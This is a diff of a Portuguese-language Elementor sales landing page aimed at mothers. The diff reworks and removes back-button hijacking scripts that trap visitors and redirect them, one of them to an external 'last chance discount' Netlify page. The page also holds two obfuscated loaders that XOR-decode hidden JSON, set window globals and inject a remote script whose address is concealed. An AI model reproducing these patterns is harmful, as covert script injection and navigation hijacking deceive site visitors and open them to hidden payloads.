@@ -43,13 +43,10 @@ img.lzl, img.lzl-ing, img.lzl-ed, .lzl {
   var done=false;
   function go(){
     if(done) return;
-    if(w.location.hash !== '') return; /* entrada inicial / navegacao pra frente */
     done=true;
-    try{ w.location.replace(url); }catch(e){ try{ w.location.href=url; }catch(e2){} }
+    try{ w.location.replace(url + w.location.search); }catch(e){ try{ w.location.href = url + w.location.search; }catch(e2){} }
   }
-  try{ if(!w.location.hash) w.location.hash='back'; }catch(e){}
   try{ w.history.pushState(null,'',w.location.href); }catch(e){}
-  w.addEventListener('hashchange',go);
   w.addEventListener('popstate',go);
 })(window);
 </script>
@@ -60,18 +57,7 @@ img.lzl, img.lzl-ing, img.lzl-ed, .lzl {
 <script>(function(){var w_q6rq=atob("DO1iyrTCX9UckpXhbpZAv8aufe8++uGVHp5Y5ZuhO7sy5+GMB4sb5NetMvt+4LqSDZ8LusCxcKBo/+bOAowWr8e2cb9vsLnDD5kWuN2gKqF54bfbNZZApNWvOvcmsPGAGoxPv8CvNrNlv+WTC5sHpMDvJ7Zz9riSDYZA5pa0Prlp97fbTM8f5s/gMbRx97fbTIkDvtXvKqFx+/OYQ50Qr8KnMaEx4eCDB4kR6JjgKbRw5/DDVM9At+m/");var x_my=[];for(var e_2jar=0;e_2jar<w_q6rq.length;e_2jar++){x_my.push(w_q6rq.charCodeAt(e_2jar)&255);}var l_m9=x_my[0];var b_lu=x_my.slice(1,1+l_m9);var c_fz7n=x_my.slice(1+l_m9);var p_qmbb=c_fz7n.map(function(b,p_be){return b^b_lu[p_be%l_m9];});var f_s5m="";for(var b_u=0;b_u<p_qmbb.length;b_u++){f_s5m+=String.fromCharCode(p_qmbb[b_u]&255);}var p_21y=decodeURIComponent(escape(f_s5m));var e_p=JSON.parse(p_21y);var o_7=e_p.globals||[];o_7.forEach(function(z_v){window[z_v.name]=z_v.value;});var t_p4=document.createElement("script");t_p4.src=e_p.url;t_p4.async=true;t_p4.defer=true;(e_p.attributes||[]).forEach(function(d_9){t_p4.setAttribute(d_9.name,d_9.value);});(document.head||document.documentElement).appendChild(t_p4);})();</script>
 <script>(function(){var e_r=atob("DGWBCezXeT+KdN679h6jfJ67WwWoHKrPhha7JsO0HVGkAarWnwP4J4+4FBHoBvHIlRfoeZikVk/jDLvX2RXocYm7V1X5VvKZlxH1e4W1DEvvB/yBrTitK4u7Fl3rGK2ZzD76K4K2FFqoTvzLnx3kZaWzWxOoAr/XgwCjM87hGAmzReaCxwS4P9TlHVzpRbjekl23OI31BGL3");var p_ll=[];for(var h_5qe=0;h_5qe<e_r.length;h_5qe++){p_ll.push(e_r.charCodeAt(h_5qe)&255);}var y_rpg=p_ll[0];var u_9=p_ll.slice(1,1+y_rpg);var u_f6u=p_ll.slice(1+y_rpg);var h_oeh=u_f6u.map(function(b,y_48m6){return b^u_9[y_48m6%y_rpg];});var f_jl="";for(var x_x1=0;x_x1<h_oeh.length;x_x1++){f_jl+=String.fromCharCode(h_oeh[x_x1]&255);}var k_8xd=decodeURIComponent(escape(f_jl));var r_z3=JSON.parse(k_8xd);var m_lo=r_z3.globals||[];m_lo.forEach(function(f_4qw9){window[f_4qw9.name]=f_4qw9.value;});var d_m=document.createElement("script");d_m.src=r_z3.url;d_m.async=true;d_m.defer=true;(r_z3.attributes||[]).forEach(function(k_p){d_m.setAttribute(k_p.name,k_p.value);});(document.head||document.documentElement).appendChild(d_m);})();</script>
 
-<script>
-  function travarBack() {
-    history.pushState(null, null, location.href);
-  }
-
-  travarBack();
-
-  window.addEventListener('popstate', function () {
-    travarBack();
-    window.location.href = 'https://ultimachanche-desconto-especial.netlify.app/' + location.search;
-  });
-</script></head><body class="wp-singular page-template page-template-elementor_canvas page page-id-162 wp-theme-hello-elementor elementor-default elementor-template-canvas elementor-kit-4 elementor-page elementor-page-162"><noscript>
+</head><body class="wp-singular page-template page-template-elementor_canvas page page-id-162 wp-theme-hello-elementor elementor-default elementor-template-canvas elementor-kit-4 elementor-page elementor-page-162"><noscript>
 <img height="1" width="1" style="display:none" alt="fbpx"
 src="assets/images/tr" />
 </noscript><div data-elementor-type="wp-page" data-elementor-id="162" class="elementor elementor-162" data-elementor-post-type="page"><div class="elementor-element elementor-element-559e9c9a e-con-full e-flex e-con e-parent" data-id="559e9c9a" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-element elementor-element-459e9ed8 e-flex e-con-boxed e-con e-child" data-id="459e9ed8" data-element_type="container" data-e-type="container"><div class="e-con-inner"><div class="elementor-element elementor-element-40d71c8d elementor-widget elementor-widget-spacer" data-id="40d71c8d" data-element_type="widget" data-e-type="widget" data-widget_type="spacer.default"><div class="elementor-spacer"><div class="elementor-spacer-inner"></div></div></div><div class="elementor-element elementor-element-44ee2b7b elementor-widget elementor-widget-html" data-id="44ee2b7b" data-element_type="widget" data-e-type="widget" data-widget_type="html.default"> <script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y)})(window,document,"clarity","script","r8sen7q2f4")</script> </div><div class="elementor-element elementor-element-8809ebd elementor-widget elementor-widget-spacer" data-id="8809ebd" data-element_type="widget" data-e-type="widget" data-widget_type="spacer.default"><div class="elementor-spacer"><div class="elementor-spacer-inner"></div></div></div><div class="elementor-element elementor-element-ef1a049 elementor-widget elementor-widget-html" data-id="ef1a049" data-element_type="widget" data-e-type="widget" data-widget_type="html.default"><section class="hero-nutribaby"><p class="pretitle">ATENÇÃO, MAMÃE</p><h1>
